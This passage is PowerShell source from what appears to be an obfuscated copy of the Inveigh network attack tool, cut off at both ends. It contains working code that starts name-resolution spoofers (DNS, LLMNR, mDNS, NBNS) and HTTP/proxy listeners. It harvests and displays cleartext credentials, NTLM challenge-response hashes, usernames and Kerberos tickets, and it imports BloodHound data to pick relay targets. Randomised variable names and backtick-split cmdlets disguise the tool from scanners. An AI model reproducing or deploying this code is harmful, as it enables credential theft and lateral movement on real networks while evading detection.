    $EyesNorth.AddScript($YokeInjure).AddArgument($MeekSmoggy).AddArgument(
        $SmashDolls).AddArgument($BlushCattle).AddArgument($ThawMiddle).AddArgument($StickLame).AddArgument(
        $HoleRoute).AddArgument($BikeLoud).AddArgument($ObeyAttack).AddArgument(
        $WoozyClose).AddArgument($JokeFaulty) > $null
    $EyesNorth.BeginInvoke() > $null
}

# Microsoft".
function NBNSBruteForceSpoofer
{
    $RefuseCanvas = [RunspaceFactory]::CreateRunspace()
    $RefuseCanvas.Open()
    $RefuseCanvas.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $TeenyBasin = [PowerShell]::Create()
    $TeenyBasin.Runspace = $RefuseCanvas
    $TeenyBasin.AddScript($LivelySqueak) > $null
    $TeenyBasin.AddScript($KickWord).AddArgument(
    $DelayValue).AddArgument($MournMean).AddArgument($NorthLumpy).AddArgument(
    $BlushCattle).AddArgument($StickLame) > $null
    $TeenyBasin.BeginInvoke() > $null
}

# Microsoft".
function ControlLoop
{
    $CastHope = [RunspaceFactory]::CreateRunspace()
    $CastHope.Open()
    $CastHope.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $ShirtFlower = [PowerShell]::Create()
    $ShirtFlower.Runspace = $CastHope
    $ShirtFlower.AddScript($LivelySqueak) > $null
    $ShirtFlower.AddScript($StreetFound) > $null
    $ShirtFlower.AddScript($ErectJog).AddArgument($HeatIll).AddArgument(
        $CuteGroup).AddArgument($BlackFilthy).AddArgument($TrapJoin).AddArgument(
        $KnownFood).AddArgument($StoryFurry).AddArgument($LiveSedate).AddArgument(
        $BouncyEven).AddArgument($ShinyAunt).AddArgument($ViewNice).AddArgument(
        $IceFix).AddArgument($FarDry).AddArgument($FullGrin).AddArgument(
        $FailDad).AddArgument($DressGround).AddArgument($MournMean).AddArgument(
        $MatterOffice).AddArgument($GrowthWind).AddArgument($StickLame) > $null
    $ShirtFlower.BeginInvoke() > $null
}

# Microsoft".
# Microsoft".

# Microsoft".
if($ChargeClap -eq 'Y')
{
    HTTPListener
}

# Microsoft".
if($SourBottle -eq 'Y')
{
    HTTPSListener
}

# Microsoft".
if($JumpyWrench -eq 'Y')
{
    ProxyListener
}

# Microsoft".
if(($HomelyShow -eq 'Y' -or $LipMeat -eq 'Y' -or $BoilClever -eq 'Y' -or $PeckFirst -eq 'Y' -or $NorthAmuck -eq 'Y' -or $MeekSmoggy) -and $DressGround)
{ 
    SnifferSpoofer
}
elseif(($HomelyShow -eq 'Y' -or $LipMeat -eq 'Y' -or $BoilClever -eq 'Y' -or $PeckFirst -eq 'Y' -or $NorthAmuck -eq 'Y') -and !$DressGround)
{

    if($HomelyShow -eq 'Y')
    {
        DNSSpoofer
    }

    if($LipMeat -eq 'Y')
    {
        LLMNRSpoofer
    }

    if($BoilClever -eq 'Y')
    {
        mDNSSpoofer
    }

    if($PeckFirst -eq 'Y')
    {
        NBNSSpoofer
    }

    if($SeaEarth -eq 'Y')
    {
        NBNSBruteForceSpoofer
    }

}

# Microsoft".
if($SeaEarth -eq 'Y')
{
    NBNSBruteForceSpoofer
}

# Microsoft".
ControlLoop

# Microsoft".
try
{

    if($RottenBed -ne 'N')
    {

        if($CycleLovely)
        {    
            $RelyHollow = New-TimeSpan -Minutes $CycleLovely
            $EggsBike = [System.Diagnostics.Stopwatch]::StartNew()
        }

        :console_loop while(($LightOval.running -and $LightOval.console_output) -or ($LightOval.console_queue.Count -gt 0 -and $LightOval.console_output))
        {
    
            while($LightOval.console_queue.Count -gt 0)
            {

                switch -wildcard ($LightOval.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {

                        if($LightOval.output_stream_only)
                        {
                            Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
                        }
                        else
                        {
                            Write-Warning($LightOval.console_queue[0])
                        }

                        $LightOval.console_queue.RemoveAt(0)
                    }

                    {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($RottenBed -eq 'Y')
                        {

                            if($LightOval.output_stream_only)
                            {
                                Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
                            }
                            else
                            {
                                Write-TableSteam($LightOval.console_queue[0])
                            }

                        }

                        $LightOval.console_queue.RemoveAt(0)
                    } 

                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                    {
                    
                        if($RottenBed -ne "Low")
                        {

                            if($LightOval.output_stream_only)
                            {
                                Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
                            }
                            else
                            {
                                Write-TableSteam($LightOval.console_queue[0])
                            }

                        }

                        $LightOval.console_queue.RemoveAt(0)
                    } 

                    default
                    {

                        if($LightOval.output_stream_only)
                        {
                            Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
                        }
                        else
                        {
                            Write-TableSteam($LightOval.console_queue[0])
                        }

                        $LightOval.console_queue.RemoveAt(0)
                    }

                }

            }

            if($CycleLovely -and $EggsBike.Elapsed -ge $RelyHollow)
            {
            
                if($LightOval.cleartext_list.Count -gt 0)
                {
                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $LightOval.newline)
                    $LightOval.cleartext_list.Sort()
                    $PestAwake = $LightOval.cleartext_list

                    foreach($HeapMarked in $PestAwake)
                    {

                        if($HeapMarked -ne $FaultyGlow)
                        {
                            Write-TableSteam($HeapMarked + $LightOval.newline)
                        }

                        $FaultyGlow = $HeapMarked
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-TableSteam("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $LightOval.newline)
                }

                if($LightOval.POST_request_list.Count -gt 0)
                {
                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $LightOval.newline)
                    $LightOval.POST_request_list.Sort()
                    $EarBucketGround = $LightOval.POST_request_list

                    foreach($NoisyPour in $EarBucketGround)
                    {

                        if($NoisyPour -ne $PotatoHeat)
                        {
                            Write-TableSteam($NoisyPour + $LightOval.newline)
                        }

                        $PotatoHeat = $NoisyPour
                    }

                    Start-Sleep -m 5
                }
            
                if($LightOval.NTLMv1_list.Count -gt 0)
                {
                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $LightOval.newline)
                    $LightOval.NTLMv1_list.Sort()
                    $RayGlue = $LightOval.NTLMv1_list

                    foreach($BattleHover in $RayGlue)
                    {
                        $PlaceDonkey = $BattleHover.SubString(0,$BattleHover.IndexOf(":",($BattleHover.IndexOf(":") + 2)))

                        if($PlaceDonkey -ne $LooseStop)
                        {
                            Write-TableSteam($BattleHover + $LightOval.newline)
                        }

                        $LooseStop = $PlaceDonkey
                    }

                    $LooseStop = ''
                    Start-Sleep -m 5
                    Write-TableSteam("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $LightOval.newline)
                    $InsectBouncy = $LightOval.NTLMv1_username_list

                    foreach($UnableLove in $InsectBouncy)
                    {
                        Write-TableSteam($UnableLove + $LightOval.newline)
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-TableSteam("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $LightOval.newline)
                }

                if($LightOval.NTLMv2_list.Count -gt 0)
                {
                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $LightOval.newline)
                    $LightOval.NTLMv2_list.Sort()
                    $EdgeSide = $LightOval.NTLMv2_list

                    foreach($BrakeSoap in $EdgeSide)
                    {
                        $GustyScared = $BrakeSoap.SubString(0,$BrakeSoap.IndexOf(":",($BrakeSoap.IndexOf(":") + 2)))

                        if($GustyScared -ne $OilDrop)
                        {
                            Write-TableSteam($BrakeSoap + $LightOval.newline)
                        }

                        $OilDrop = $GustyScared
                    }

                    $OilDrop = ''
                    Start-Sleep -m 5
                    Write-TableSteam("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $LightOval.newline)
                    $RiddleAttach = $LightOval.NTLMv2_username_list

                    foreach($HousesFire in $RiddleAttach)
                    {
                        Write-TableSteam($HousesFire + $LightOval.newline)
                    }
                
                }
                else
                {
                    Write-TableSteam("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $LightOval.newline)
                }

                $EggsBike = [System.Diagnostics.Stopwatch]::StartNew()
            }

            if($LightOval.console_input)
            {

                if([Console]::KeyAvailable)
                {
                    $LightOval.console_output = $false
                    BREAK console_loop
                }
        
            }

            Start-Sleep -m 5
        }

    }

}
finally
{

    if($BaseBright -eq 2)
    {
        $LightOval.running = $false
    }

}

}
# Microsoft".
# Microsoft".
function Stop-LightOval
{

    if($LightOval)
    {
        $LightOval.stop = $true
        
        if($LightOval.running -or $LightOval.relay_running)
        {
            $LightOval.console_queue.Clear()
            Watch-LightOval -FitTrade
        }
        else
        {
            Write-TableSteam "[-] There are no running Inveigh functions"
        }

    }

}

function Get-LightOval
{

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][Switch]$AskEffect,
        [parameter(Mandatory=$false)][Switch]$ProseBrake,
        [parameter(Mandatory=$false)][Switch]$StarGreedy,
        [parameter(Mandatory=$false)][Switch]$TourManage,
        [parameter(Mandatory=$false)][Switch]$PumpCuddly,
        [parameter(Mandatory=$false)][Int]$TinClassy,
        [parameter(Mandatory=$false)][Switch]$MissAlert,
        [parameter(Mandatory=$false)][Switch]$CrownShort,
        [parameter(Mandatory=$false)][Switch]$BatAfraid,
        [parameter(Mandatory=$false)][Switch]$MarketJuggle,
        [parameter(Mandatory=$false)][Switch]$WishMetal,
        [parameter(Mandatory=$false)][Switch]$ScrewOffend,
        [parameter(Mandatory=$false)][Switch]$WormHug,
        [parameter(Mandatory=$false)][Switch]$ActInsect,
        [parameter(Mandatory=$false)][Switch]$CubCall,
        [parameter(Mandatory=$false)][Switch]$UncleJuice,
        [parameter(Mandatory=$false)][Switch]$FixedRabbit,
        [parameter(Mandatory=$false)][Switch]$RejectFast,
        [parameter(Mandatory=$false)][Switch]$FoldDam,
        [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
    )

    if($StarGreedy -or $WickedRare.Count -eq 0)
    {

        while($LightOval.console_queue.Count -gt 0)
        {

            if($LightOval.output_stream_only)
            {
                Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
                $LightOval.console_queue.RemoveAt(0)
            }
            else
            {

                switch -wildcard ($LightOval.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $LightOval.console_queue[0]
                        $LightOval.console_queue.RemoveAt(0)
                    }

                    default
                    {
                        Write-TableSteam $LightOval.console_queue[0]
                        $LightOval.console_queue.RemoveAt(0)
                    }

                }

            }
            
        }

    }

    if($TourManage)
    {
        $BaseDapper = $LightOval.ADIDNS_table.Keys

        foreach($KnottyHelp in $BaseDapper)
        {
            
            if($LightOval.ADIDNS_table.$KnottyHelp -ge 1)
            {
                Write-TableSteam $KnottyHelp
            }

        }

    }

    if($PumpCuddly)
    {

        $BaseDapper = $LightOval.ADIDNS_table.Keys

        foreach($KnottyHelp in $BaseDapper)
        {
            
            if($LightOval.ADIDNS_table.$KnottyHelp -eq 0)
            {
                Write-TableSteam $KnottyHelp
            }

        }

    }

    if($TinClassy)
    {
        Write-TableSteam $LightOval.kerberos_TGT_list[$TinClassy]
    }

    if($MissAlert)
    {
        Write-TableSteam $LightOval.kerberos_TGT_username_list
    }

    if($BatAfraid)
    {
        Write-TableSteam $LightOval.log
    }

    if($MarketJuggle)
    {
        Write-TableSteam $LightOval.NTLMv1_list
    }

    if($ScrewOffend)
    {
        $LightOval.NTLMv1_list.Sort()
        $RayGlue = $LightOval.NTLMv1_list

        foreach($BattleHover in $RayGlue)
        {
            $PlaceDonkey = $BattleHover.SubString(0,$BattleHover.IndexOf(":",($BattleHover.IndexOf(":") + 2)))

            if($PlaceDonkey -ne $LooseStop)
            {
                Write-TableSteam $BattleHover
            }

            $LooseStop = $PlaceDonkey
        }

    }

    if($ActInsect)
    {
        Write-TableSteam $LightOval.NTLMv2_username_list
    }

    if($WishMetal)
    {
        Write-TableSteam $LightOval.NTLMv2_list
    }

    if($WormHug)
    {
        $LightOval.NTLMv2_list.Sort()
        $EdgeSide = $LightOval.NTLMv2_list

        foreach($BrakeSoap in $EdgeSide)
        {
            $GustyScared = $BrakeSoap.SubString(0,$BrakeSoap.IndexOf(":",($BrakeSoap.IndexOf(":") + 2)))

            if($GustyScared -ne $OilDrop)
            {
                Write-TableSteam $BrakeSoap
            }

            $OilDrop = $GustyScared
        }

    }

    if($CubCall)
    {
        Write-TableSteam $LightOval.NTLMv2_username_list
    }

    if($AskEffect)
    {
        Write-TableSteam $LightOval.cleartext_list
    }

    if($ProseBrake)
    {
        Write-TableSteam $LightOval.cleartext_list | Get-Unique
    }

    if($UncleJuice)
    {
        Write-TableSteam $LightOval.POST_request_list
    }

    if($FixedRabbit)
    {
        Write-TableSteam $LightOval.POST_request_list | Get-Unique
    }

    if($CrownShort)
    {
        Write-TableSteam $LightOval.valid_host_list
    }

    if($RejectFast)
    {
        $ColorReply = 0

        while($ColorReply -lt $LightOval.session_socket_table.Count)
        {

            if(!$LightOval.session_socket_table[$ColorReply].Connected)
            {
                $LightOval.session[$ColorReply] | Where-Object {$_.Status = "disconnected"}
            }
        
            $ColorReply++
        }

        Write-TableSteam $LightOval.session | Format-Table -AutoSize
    }

    if($FoldDam)
    {
        Write-TableSteam $LightOval.enumerate
    }

}

function Watch-LightOval
{

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]$FitTrade,
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$RottenBed = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
)

if($LightOval.tool -ne 1)
{

    if($LightOval.running -or $LightOval.relay_running)
    {
        
        if(!$FitTrade)
        {
            Write-TableSteam "[*] Press any key to stop console output"
        }

        $LightOval.console_output = $true

        :console_loop while((($LightOval.running -or $LightOval.relay_running) -and $LightOval.console_output) -or ($LightOval.console_queue.Count -gt 0 -and $LightOval.console_output))
        {

            while($LightOval.console_queue.Count -gt 0)
            {

                switch -wildcard ($LightOval.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $LightOval.console_queue[0]
                        $LightOval.console_queue.RemoveAt(0)
                    }

                    {$_ -like "*spoofer disabled]" -or $_ -like "*local request]" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($RottenBed -eq 'Y')
                        {
                            Write-TableSteam $LightOval.console_queue[0]
                        }

                        $LightOval.console_queue.RemoveAt(0)

                    } 

                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                    {
                    
                        if($RottenBed -ne "Low")
                        {
                            Write-TableSteam $LightOval.console_queue[0]
                        }

                        $LightOval.console_queue.RemoveAt(0)

                    } 

                    default
                    {
                        Write-TableSteam $LightOval.console_queue[0]
                        $LightOval.console_queue.RemoveAt(0)
                    }

                } 

            }

            if([Console]::KeyAvailable)
            {
                $LightOval.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-TableSteam "[-] Inveigh isn't running"
    }

}
else
{
    Write-TableSteam "[-] Watch-LightOval cannot be used with current external tool selection"
}

}

function Clear-LightOval
{

if($LightOval)
{

    if(!$LightOval.running -and !$LightOval.relay_running)
    {
        Remove-Variable inveigh -scope global
        Write-TableSteam "[+] Inveigh data has been cleared from memory"
    }
    else
    {
        Write-TableSteam "[-] Run Stop-LightOval before running Clear-LightOval"
    }

}

}

function ConvertTo-LightOval
{

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$BusyPast,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$RainyShave,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$RoughGate,
        [parameter(Mandatory=$false)][Switch]$HomelyShow,
        [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
    )

    if(!$BusyPast -and !$RainyShave -and !$RoughGate)
    {
        Write-TableSteam "Specifiy a BloodHound computers, groups, or sessions JSON file"
        throw
    }

    if($LightOval.running -or $LightOval.relay_running)
    {
        Write-TableSteam "Run Stop-LightOval before importing data with ConvertTo-LightOval"
        throw
    }

    if(!$LightOval)
    {
        $GrinFamous:inveigh = [HashTable]::Synchronized(@{})
        $LightOval.cleartext_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.enumerate = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.IP_capture_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.log = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.kerberos_TGT_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.kerberos_TGT_username_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.NTLMv1_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.NTLMv1_username_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.NTLMv2_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.NTLMv2_username_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.POST_request_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.valid_host_list = ne`w-`obje`ct System.Collections.ArrayList
        $LightOval.ADIDNS_table = [HashTable]::Synchronized(@{})
        $LightOval.relay_privilege_table = [HashTable]::Synchronized(@{})
        $LightOval.relay_failed_login_table = [HashTable]::Synchronized(@{})
        $LightOval.relay_history_table = [HashTable]::Synchronized(@{})
        $LightOval.request_table = [HashTable]::Synchronized(@{})
        $LightOval.session_socket_table = [HashTable]::Synchronized(@{})
        $LightOval.session_table = [HashTable]::Synchronized(@{})
        $LightOval.session_message_ID_table = [HashTable]::Synchronized(@{})
        $LightOval.session_lock_table = [HashTable]::Synchronized(@{})
        $LightOval.SMB_session_table = [HashTable]::Synchronized(@{})
        $LightOval.domain_mapping_table = [HashTable]::Synchronized(@{})
        $LightOval.group_table = [HashTable]::Synchronized(@{})
        $LightOval.session_count = 0
        $LightOval.session = @()
    }

    function New-RelayEnumObject
    {
        param ($SmashDolls,$OrderSteam,$PaddlePedal,$QuickFlimsy,$RainyShave,$ItchyDusty,$FryHarbor,
            $MurderYummy,$GaudyWait,$RusticCare,$UniteDuck,$StiffFull,$RelyTawdry,$MeddleBruise,$TeenySound,$StuffSnotty,
            $AuntCalm,$PloughBouncy,$FoldDam,$HeadyCan)

        if($RainyShave -and $RainyShave -isnot [Array]){$RainyShave = @($RainyShave)}
        if($ItchyDusty -and $ItchyDusty -isnot [Array]){$ItchyDusty = @($ItchyDusty)}
        if($FryHarbor -and $FryHarbor -isnot [Array]){$FryHarbor = @($FryHarbor)}
        if($MurderYummy -and $MurderYummy -isnot [Array]){$MurderYummy = @($MurderYummy)}
        if($GaudyWait -and $GaudyWait -isnot [Array]){$GaudyWait = @($GaudyWait)}
        if($RusticCare -and $RusticCare -isnot [Array]){$RusticCare = @($RusticCare)}
        if($UniteDuck -and $UniteDuck -isnot [Array]){$UniteDuck = @($UniteDuck)}
        if($StiffFull -and $StiffFull -isnot [Array]){$StiffFull = @($StiffFull)}

        $AllowDebt = ne`w-`obje`ct PSObject
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Index" $LightOval.enumerate.Count
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "IP" $SmashDolls
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Hostname" $OrderSteam
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "DNS Domain" $PaddlePedal
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "netBIOS Domain" $QuickFlimsy
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Sessions" $RainyShave
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Users" $ItchyDusty
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Groups" $FryHarbor
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Privileged" $MurderYummy
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Shares" $GaudyWait
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions" $RusticCare
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions Mapped" $UniteDuck
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Local Users" $StiffFull
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB2.1" $RelyTawdry
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Signing" $MeddleBruise
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB Server" $TeenySound
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "DNS Record" $StuffSnotty
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "IPv6 Only" $AuntCalm
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Targeted" $PloughBouncy
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Enumerate" $FoldDam
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Execute" $HeadyCan
        
        return $AllowDebt
    }

    function Get-DNSEntry([String]$OrderSteam)
    {

        try
        {
            $IllStay = [System.Net.Dns]::GetHostEntry($OrderSteam)

            foreach($TrashyGiants in $IllStay.AddressList)
            {

                if(!$TrashyGiants.IsIPv6LinkLocal)
                {
                    $SmashDolls = $TrashyGiants.IPAddressToString
                }

            }
                    
        }
        catch
        {
            $SmashDolls = $null
        }

        return $SmashDolls
    }

    # Microsoft".
    function Invoke-ParseItem($EagerScrew) 
    {

        if($EagerScrew.PSObject.TypeNames -match 'Array') 
        {
            return Invoke-ParseJsonArray($EagerScrew)
        }
        elseif($EagerScrew.PSObject.TypeNames -match 'Dictionary') 
        {
            return Invoke-ParseJsonObject([HashTable]$EagerScrew)
        }
        else 
        {
            return $EagerScrew
        }

    }

    function Invoke-ParseJsonObject($FoodAir) 
    {
        $BatFax = ne`w-`obje`ct -TypeName PSCustomObject

        foreach($PeepSmell in $FoodAir.Keys) 
        {
            $item = $FoodAir[$PeepSmell]

            if ($item) 
            {
                $GateBetter = Invoke-ParseItem $item
            }
            else 
            {
                $GateBetter = $null
            }

            $BatFax | Add-Member -MemberType NoteProperty -Name $PeepSmell -Value $GateBetter
        }

        return $BatFax
    }

    function Invoke-ParseJSONArray($BellPunch) 
    {
        $BatFax = @()
        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
        $ColorReply = 0

        $BellPunch | ForEach-Object -Process {

            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
            {
                $PetiteSail = [Math]::Truncate($ColorReply / $BellPunch.count * 100)

                if($PetiteSail -le 100)
                {
                    Write-Progress -Activity "Parsing JSON" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
                }

                $SuddenIcicle.Reset()
                $SuddenIcicle.Start()
            }

            $ColorReply++
            $BatFax += , (Invoke-ParseItem $_)}

        return $BatFax
    }

    function Invoke-ParseJSONString($DizzySilver) 
    {
        $NeedleSuperb = $DrunkUse.DeserializeObject($DizzySilver)

        return Invoke-ParseJsonObject $NeedleSuperb
    }

    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")

    if($LightOval.enumerate.Count -eq 0)
    {
        $MarketAsk = $true
    }

    if($BusyPast)
    {       
        $BusyPast = (Resolve-Path $BusyPast).Path
        $SeaCrook = ne`w-`obje`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $SeaCrook.MaxJsonLength = 104857600
        $QuaintDecide = [System.IO.File]::ReadAllText($BusyPast)
        $QuaintDecide = $SeaCrook.DeserializeObject($QuaintDecide)
        Write-TableSteam "[*] Parsing BloodHound Computers JSON"
        $SonEgg = [System.Diagnostics.Stopwatch]::StartNew()
        $QuaintDecide = Invoke-ParseItem $QuaintDecide
        Write-TableSteam "[+] Parsing completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
        $SonEgg.Reset()
        $SonEgg.Start()
        Write-TableSteam "[*] Importing computers to Inveigh"
        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
        $ColorReply = 0

        if(!$QuaintDecide.Computers)
        {
            Write-TableSteam "[!] JSON computers parse failed"
            throw
        }

        $QuaintDecide.Computers | ForEach-Object {

            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
            {
                $PetiteSail = [Math]::Truncate($ColorReply / $QuaintDecide.Computers.Count * 100)

                if($PetiteSail -le 100)
                {
                    Write-Progress -Activity "[*] Importing computers" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
                }

                $SuddenIcicle.Reset()
                $SuddenIcicle.Start()
            }

            $OrderSteam = $_.Name
            [Array]$SmashFull = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name
            [Array]$ShirtFilm = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name

            if($HomelyShow)
            {
                $SmashDolls = Get-DNSEntry $OrderSteam

                if(!$SmashDolls)
                {
                    Write-TableSteam "[-] DNS lookup for $OrderSteam failed"
                }

            }

            if(!$MarketAsk)
            {

                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
                {

                    if(($OrderSteam -and $LightOval.enumerate[$ColorReply].Hostname -eq $OrderSteam) -or ($SmashDolls -and $LightOval.enumerate[$ColorReply].IP -eq $SmashDolls))
                    {

                        if($LightOval.enumerate[$ColorReply].Hostname -ne $OrderSteam -and $LightOval.enumerate[$ColorReply].IP -eq $SmashDolls)
                        {

                            for($WindyEarth = 0;$WindyEarth -lt $LightOval.enumerate.Count;$WindyEarth++)
                            {

                                if($LightOval.enumerate[$WindyEarth].IP -eq $DogSuffer)
                                {
                                    $SuperRigid = $WindyEarth
                                    break
                                }

                            }

                            $LightOval.enumerate[$SuperRigid].Hostname = $OrderSteam
                        }
                        else
                        {

                            for($WindyEarth = 0;$WindyEarth -lt $LightOval.enumerate.Count;$WindyEarth++)
                            {

                                if($LightOval.enumerate[$WindyEarth].Hostname -eq $OrderSteam)
                                {
                                    $SuperRigid = $WindyEarth
                                    break
                                }

                            }

                        }

                        $LightOval.enumerate[$SuperRigid]."Administrator Users" = $SmashFull
                        $LightOval.enumerate[$SuperRigid]."Administrator Groups" = $ShirtFilm
                    }
                    else
                    {
                        $LightOval.enumerate.Add((New-RelayEnumObject -OrderSteam $_.Name -SmashDolls $SmashDolls -ItchyDusty $SmashFull -FryHarbor $ShirtFilm)) > $null
                    }

                }

            }
            else
            {
                $LightOval.enumerate.Add((New-RelayEnumObject -OrderSteam $_.Name -SmashDolls $SmashDolls -ItchyDusty $SmashFull -FryHarbor $ShirtFilm)) > $null
            }

            $SmashDolls = $null
            $OrderSteam = $null
            $SmashFull = $null
            $ShirtFilm = $null
            $SuperRigid = $null
            $ColorReply++
        }

        Write-TableSteam "[+] Import completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
        $SonEgg.Reset()
        Remove-Variable bloodhound_computers
    }

    if($RainyShave)
    {
        $RainyShave = (Resolve-Path $RainyShave).Path
        $FetchPump = ne`w-`obje`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $FetchPump.MaxJsonLength = 104857600
        $BurnRhythm = [System.IO.File]::ReadAllText($RainyShave)
        $BurnRhythm = $FetchPump.DeserializeObject($BurnRhythm)
        $SonEgg = [System.Diagnostics.Stopwatch]::StartNew()
        Write-TableSteam "[*] Parsing BloodHound Sessions JSON"
        $BurnRhythm = Invoke-ParseItem $BurnRhythm
        Write-TableSteam "[+] Parsing completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
        $SonEgg.Reset()
        $SonEgg.Start()
        Write-TableSteam "[*] Importing sessions to Inveigh"
        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
        $ColorReply = 0

        if(!$BurnRhythm.Sessions)
        {
            Write-TableSteam "[!] JSON sessions parse failed"
            throw
        }

        $BurnRhythm.Sessions | ForEach-Object {
            
            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
            {
                $PetiteSail = [Math]::Truncate($ColorReply / $BurnRhythm.Sessions.Count * 100)

                if($PetiteSail -le 100)
                {
                    Write-Progress -Activity "[*] Importing sessions" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
                }

                $SuddenIcicle.Reset()
                $SuddenIcicle.Start()
            }

            $OrderSteam = $_.ComputerName

            if($OrderSteam -as [IPAddress] -as [Bool])
            {
                $SmashDolls = $OrderSteam
                $OrderSteam = $null

                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
                {

                    if($LightOval.enumerate[$ColorReply].IP -eq $DogSuffer)
                    {
                        $SuperRigid = $ColorReply
                        break
                    }

                }

            }
            else
            {
                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
                {

                    if($LightOval.enumerate[$ColorReply].Hostname -eq $OrderSteam)
                    {
                        $SuperRigid = $ColorReply
                        break
                    }

                }

                if($HomelyShow)
                {
                    $SmashDolls = Get-DNSEntry $OrderSteam

                    if(!$SmashDolls)
                    {
